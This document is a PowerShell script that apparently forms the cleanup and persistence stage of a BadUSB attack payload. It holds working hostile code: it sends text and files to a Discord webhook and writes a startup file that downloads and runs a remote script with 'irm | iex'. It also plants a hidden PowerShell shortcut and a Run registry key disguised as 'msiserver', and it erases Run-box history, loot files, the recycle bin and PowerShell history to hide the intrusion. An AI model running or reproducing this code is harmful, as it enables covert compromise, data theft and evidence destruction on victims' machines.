# Delete run box history first, incase user checks immediately

reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
############################################################################################################################################################

function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = "$dc"

$Body = @{
  'username' = $FolderName
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}
$text='Persistence removed from '+$env:user
if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -text $text}

############################################################################################################################################################
 
# Setup Persistence if possible

function Test-RegistryValue {

	param (
	
	 [parameter(Mandatory=$true)]
	 [ValidateNotNullOrEmpty()]$Path,
	
	[parameter(Mandatory=$true)]
	 [ValidateNotNullOrEmpty()]$Value
	)
	
	try {
	
	Get-ItemProperty -Path $Path | Select-Object -ExpandProperty $Value -ErrorAction Stop | Out-Null
	 return $true
	 }
	
	catch {
	
	return $false
	
	}
	
}

if ($pers -eq 'True'){
	if(![System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.ps1")){
		$data = "`$dc='$dc'`$pers='$pers'irm https://raw.githubusercontent.com/sealldeveloper/files.seall.dev/main/badusb/SeallDEV%2Bjakoby-RECON.ps1 | iex"
		$data | Out-File $env:appdata+"\..\Local\msiserver.ps1"
	}
	if(![System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.lnk")){
		$objShell = New-Object -COM WScript.Shell
		$objShortCut = $objShell.CreateShortcut($env:appdata+"\..\Local\msiserver.lnk")
		$target = "powershell"
		$args = "-Nop -Noni -w h -ep bypass -command `"$env:appdata\..\Local\msiserver.lnk`""
		$objShortCut.TargetPath = $target
		$objShortcut.Arguments = $args
		$objShortCut.Save()
	}
	$path = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run"
	$val = $env:USERPROFILE+"\msiserver.lnk"
	$testVal = Test-RegistryValue -Path $path -Value $val
	if ($testVal -eq $true){
	New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion" -Name run -Force
	New-ItemProperty -Path $path -Name "msiserver" -Value $val -PropertyType "String"
	}
}
if ($pers -eq 'Remove') {
	Remove-Item $env:appdata+"\..\Local\msiserver.ps1"
	Remove-Item $env:appdata+"\..\Local\msiserver.lnk"
	Remove-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\run" -Name "msiserver" -PropertyType "String"
}



############################################################################################################################################################

<#
.NOTES 
	This is to clean up behind you and remove any evidence to prove you were there
#>

# Delete loot files 

Remove-Item $env:TEMP\$FolderName\* -r -Force -ErrorAction SilentlyContinue
Remove-Item $env:TEMP\$FolderName -r -Force -ErrorAction SilentlyContinue
Remove-Item $env:TEMP\$ZIP -r -Force -ErrorAction SilentlyContinue

# Deletes contents of recycle bin

Clear-RecycleBin -Force -ErrorAction SilentlyContinue

# Delete powershell history after all commands, to disguise all cleanup

Remove-Item (Get-PSreadlineOption).HistorySavePath

		
############################################################################################################################################################

# Popup message to signal the payload is done

#$done = New-Object -ComObject Wscript.Shell;$done.Popup("Update Completed",1)
#if([System.IO.File]::Exists($env:appdata+"\..\Local\msiserver.ps1")){
#$s=New-Object -ComObject SAPI.SpVoice
#$s.Speak("GG Loser smiley face")
#}